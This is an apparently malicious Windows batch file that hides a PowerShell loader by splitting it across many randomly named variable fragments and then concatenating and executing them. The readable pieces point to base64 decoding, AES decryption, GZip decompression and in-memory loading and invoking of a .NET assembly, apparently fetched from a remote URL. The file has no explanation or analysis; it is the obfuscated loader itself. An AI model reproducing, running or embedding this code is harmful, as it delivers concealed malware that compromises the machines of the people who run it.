@echo off
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "CJCPDqStcW= (de"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "ONzHFEdOVw=);$a"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "XmfMzhjUcD=ct I"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "iPrivjlqBg=8Hxd"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "tWhtTCYcbq=\Win"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "kRtPpEDjee=buil"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "vkoXRmDYts=vert"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "aBFNtLlJad= $p="
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "iaMhJdbRIN=();$"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "AgByNIEgBo=epla"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "fILxuOmcHG=plac"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "eEyOKOvNOV=ssem"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "yFvlYwlPJn=c (["
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "soGwoQHOha=pose"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "tXNdFKbBfM=s/he"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "GzVYadNJLZ=msi."
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "YXpBZQjdIP=tion"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "VeTCknKYSC=').R"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "sGbJCMZhIu=on.A"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "lcbryfaGrf=o.To"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "KMgoXdooLc=2\Wi"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "fcSBaeJnZR=O.Me"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "jkaxTvOqwQ=$a,$"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "NgpOkmnpyW=\pow"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "ZfrJGUenSn=n.GZ"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "RFdMUZuljO=erSh"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "ILQTQbMLpJ=();$"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "tmOysnphZW=sPow"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "HDtaiPSqgG=.IV="
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "onWAxZvCuC=unct"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "UUymZZaNKz=A'))"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "UahcckqVKt=TG/M"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "NjDEoqxpPx=y();"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "PRINbmJGUQ=grap"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "LBzgRyjMoD=\Sys"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "RFPNAdeLKt=t.In"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "fZIshFbzLz==');"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "aKvUyDZIYG=mpre"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "MIwiJJgeac=);$a"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "YXDhkRgflf=-Hos"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "ZOdPKcdKSO=@','"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "GthBavrDar=g('g"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "NPSwnUUNmk=mpre"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "hjtUjfcWht=a.Di"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "AALWaMqyQe=Some"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "WwvmqNjjeV=$p[0"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "UXxHuXtkdF=//ra"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "kazhCojOyu=Pars"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "vyveiWpGqQ=;$gz"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "paIkFgpzIh=$mso"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "qjPIYYlMxP=emor"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "jNQgBRCgfy=','A"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "pgjFtySYHd=ecti"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "usHyOPvRma=ent-"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "TVoWAWKkjI=QAg2"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "JaUucWFvse=t.ba"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "PGACogAjgJ=Decr"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "UJGpLaSovF=r};f"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "MPLcqrMhhc=$b);"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "jvTgEFePak= dec"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "fpmogTBKaN=b){$"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "hZxQZLdUxa=e64S"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "wQWDgVAHJc=vert"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "xJgmyaPTlo=urit"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "nrvrBmLTJR=ng($"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "WIdBQiCtgR=se64"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "FIWKMOEypH=));$"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "wxkTNQfmco=6nb+"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "ylRMkzlBNK=ersh"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "cJWIkIxzzj=voke"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "tgoufbIBbV=xKg="
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "cekLcSvKic=a).E"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "kQwmvvTMki=ting"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "mYodXmNzOR=spos"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "nUpyTISstl=a.Ke"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "mTXAKnTUYP=$arg"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "IeqDQxzvrh=$gz."
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "bxOzJpyaUA=ipSt"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "KqabCuMozA= unz"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "rHUOzAgRzw=:Cre"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "wHtUZympTk=ing)"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "ZJOSyaYaas=,0,$"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "usIhJlChlK=3PlL"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "ZTEirnJEVR=omBa"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "WplXKahRTO=n.Co"
%wGHxvhDoWd%%aBFNtLlJad%%CynxtQAfnu%%qyRhuTeZVV%%lolyFKzDMU%%UXxHuXtkdF%%GxbBNBJytA%%GmOeSonORJ%%qWssAsbjMw%%zUVqoNnJLd%%abklnHisPg%%KEsuoKfIau%%AALWaMqyQe%%aDdNIpLheS%%kJtGLUCAcE%%IFJqDApnkB%%rKBLghBEMY%%YXDhkRgflf%%kQwmvvTMki%%ZxWDBzhIAD%%tXNdFKbBfM%%ukcerAoppK%%nPuEYAbaGL%%KxFHMmcsGK%%usHyOPvRma%%kRtPpEDjee%%JaUucWFvse%%yVIEqVhWQj%%fkOFASePri%%JSoCbtxnvR%%kazhCojOyu%%wHtUZympTk%%RPdjvFHgCX%%xUAYZfLGdl%%IqqXMbztDC%%hitlauWpMW%%HdlBWChuVT%%NFlHBBygwt%%fnDaPpAoYE%%jvTgEFePak%%UfyJOBWLKy%%VQSsQuAlLH%%bSvqKsLedW%%xJgmyaPTlo%%sOEAIsCBqj%%eSdsicJhYw%%PRINbmJGUQ%%EGaxpnnVHr%%QkOTREGNew%%rHUOzAgRzw%%IVGAFyRFdV%%ONzHFEdOVw%%FWBxyWLlYO%%gwwlIUDoot%%MaKjHDinjU%%xsVcQMujbI%%MGHoOsqoYK%%aOzCJFlsPV%%OycdqOBuuW%%AunGHgtwup%%nUpyTISstl%%BbufUoEDXZ%%RWTckGBTUD%%lPXzIUiDkH%%ViajuzahLt%%CPyuyqanon%%hZxQZLdUxa%%fatpeIVKHK%%GthBavrDar%%TVoWAWKkjI%%vfJLnBwiqP%%uqFDHNRWPE%%uATggkLwPh%%YLAYpAKvoz%%ZimlWCpLpM%%fOvFnVmDEd%%PasjRJPHog%%dvHqFloIkE%%UahcckqVKt%%ohRlJYQdum%%MIwiJJgeac%%HDtaiPSqgG%%tUWUSWEwGG%%vkoXRmDYts%%elVIMKNQcU%%fzWNSSMBpN%%fJytGwpviV%%lUWOBiYnii%%iNtLAVoAeZ%%AbIGnvMBcp%%usIhJlChlK%%TzthErpMTK%%iPrivjlqBg%%wxkTNQfmco%%tgoufbIBbV%%fZIshFbzLz%%amGfowoAuO%%mcKErbBWdt%%BJpFbwPSLi%%PGACogAjgJ%%MignJcodbg%%dewrYqXadR%%HwOmZFChqk%%BsQtHsDcWY%%hLQFeKjiEY%%jzfocqtUnd%%AgNQFLncKF%%NVefKVFjio%%vtDsabmCrq%%ZJOSyaYaas%%xhyYkovaEg%%LkLYHhDvQD%%yLKuGeglGJ%%XFiPRoVEhM%%GmYlFOXPlq%%xDjwTLxdsg%%hjtUjfcWht%%mYodXmNzOR%%grapmuvLWf%%RRlaEwTdbz%%MaIReyogzH%%YXpBZQjdIP%%KqabCuMozA%%sJxofgIilN%%fpmogTBKaN%%mPumPvaGpJ%%MaGYopAavT%%ibSVKvdLUJ%%TbnMoDplzJ%%fcSBaeJnZR%%sBpgFlXzCu%%soLGQKNTKL%%ZpAMOgiqUF%%MPLcqrMhhc%%FQJfrQqmKq%%rPDoRdbDry%%dHEWICCJpz%%YFMIfjGuuY%%PVFEoWmxkn%%qjPIYYlMxP%%nHWlsLcViI%%wGitJhbZHL%%pfycjOPdJh%%YTXFLiZtmC%%TqoCQKawZR%%XmfMzhjUcD%%VYmbKDIDIA%%iHNfRYQVly%%OteRjLOlfD%%ZfrJGUenSn%%bxOzJpyaUA%%rnIDOCUuRY%%OxxfAcqeyW%%UDcXxrFFiU%%nOqFlMwNUe%%aKvUyDZIYG%%ZuBYGOlKgx%%WplXKahRTO%%GCjtWkhhyT%%rWGCUSmsZx%%ALHwhLyxjy%%whPkZxkibv%%GdlmfaIJdS%%NPSwnUUNmk%%LKXaxkhwCx%%IeqDQxzvrh%%cOurKHpsWf%%CxVQKWflOV%%SmgFjJyoFP%%vyveiWpGqQ%%UOzxUkizTU%%soGwoQHOha%%iaMhJdbRIN%%GzVYadNJLZ%%BZvLxgSZPr%%pAypHUcsNQ%%irQgnTtIvl%%dYdizjEbJD%%lcbryfaGrf%%buVUQkioxE%%NjDEoqxpPx%%paIkFgpzIh%%SMrpjIcjsp%%aqEfPcywdh%%ILQTQbMLpJ%%UJGpLaSovF%%onWAxZvCuC%%ITwBzhWxzh%%WqUJvrJptO%%jkaxTvOqwQ%%FjqMabmfQE%%euOnJXtnff%%pgjFtySYHd%%sGbJCMZhIu%%eEyOKOvNOV%%bAkrAzZLsC%%ioxMlytfLW%%XmFLaLHuVE%%cekLcSvKic%%MoOflQgMCm%%vqcRYPVzqP%%RFPNAdeLKt%%cJWIkIxzzj%%EVRJjLcsNm%%XVttlhzaFh%%MvbjjMttGp%%svZglVNgEO%%bLXxwhpDxc%%jwUsxiTIzx%%rILxUBVnip%%uswQgbxENb%%wQWDgVAHJc%%ceGgwsZACU%%lcvhIQZelw%%LoVxbBMhrY%%bnDfmpLqtO%%bXbSQuuOVp%%WwvmqNjjeV%%GRiDTXypUt%%fILxuOmcHG%%hXmccESqPz%%gClyikOyZS%%VeTCknKYSC%%AgByNIEgBo%%fhAvmCxnpj%%ZOdPKcdKSO%%UUymZZaNKz%%FIWKMOEypH%%QxIIDLdMNL%%EUnMulInwn%%CJCPDqStcW%%yFvlYwlPJn%%VoaYULujpB%%fqcbegUSem%%TKJQmZycOY%%ZTEirnJEVR%%WIdBQiCtgR%%BtKxulFjLV%%nrvrBmLTJR%%xqXmqkGhZe%%xeWWwGihOg%%IASaEEmLaE%%wIKoulvxhj%%EyjHxivzUU%%dEfDjWyXIL%%YVgvIOuIBl%%lKaEBjrlCw%%jNQgBRCgfy%%MyPvlJrOYJ%%NNYJJsEBbZ%%FmvlCleaUQ%%lnCdyMVEsS%%SCmSJwOhxi%%nbefSzcETa%%FrTixzkVkW%%xZijhcaCCf%%wWDLDjiwkY%%KqLsnAJeuj%%mTXAKnTUYP%%zAcNEIOiEn%%rNKlmhoQWH%%tWhtTCYcbq%%qnyvzkoXOE%%LBzgRyjMoD%%YdYqvCsIUb%%KMgoXdooLc%%SrcsVSwbBu%%tmOysnphZW%%RFdMUZuljO%%kUamKHaFvD%%frhzHxYIVJ%%NgpOkmnpyW%%ylRMkzlBNK%%mKMwQAyDfw%%aMpAbdEmbx%
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "SDjTWUuOwl=exit"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "pESIqTCtiP= /b"
%SDjTWUuOwl%%pESIqTCtiP%
